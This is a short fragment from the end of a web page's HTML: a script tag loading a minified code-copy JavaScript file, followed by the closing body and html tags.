src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>